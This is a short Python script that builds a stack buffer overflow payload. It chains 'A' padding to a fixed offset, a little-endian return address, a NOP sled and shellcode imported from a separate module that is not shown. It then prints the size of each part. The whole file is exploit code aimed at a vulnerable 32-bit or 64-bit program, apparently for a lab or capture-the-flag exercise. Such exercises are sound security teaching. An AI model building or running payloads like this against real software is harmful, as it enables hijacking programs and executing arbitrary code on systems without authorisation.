#!/usr/bin/env python3

from shellcode import get_shellcode


def pack_address(address, arch):
    if arch == "32-bit":
        return address.to_bytes(4, byteorder="little")
    elif arch == "64-bit":
        return address.to_bytes(8, byteorder="little")
    else:
        return None


def build_payload(offset, return_address, arch, shellcode, nop_size=100):
    junk_padd = b"A" * offset
    pack_addr = pack_address(return_address, arch)
    nop_sled = b"\x90" * nop_size
    payload = junk_padd + pack_addr + nop_sled + shellcode
    print(
        f"[*] Size of each component:\nJunk Padding: {len(junk_padd)} bytes\nPacked Address: {len(pack_addr)} bytes\nNOP Sled: {len(nop_sled)} bytes\nShellcode: {len(shellcode)} bytes")
    print(f"[*] Total payload size: {len(payload)} bytes")
    return payload


if __name__ == "__main__":
    payload = build_payload(76, 0xffffd580, "32-bit",
                            get_shellcode("32-bit"), 100)
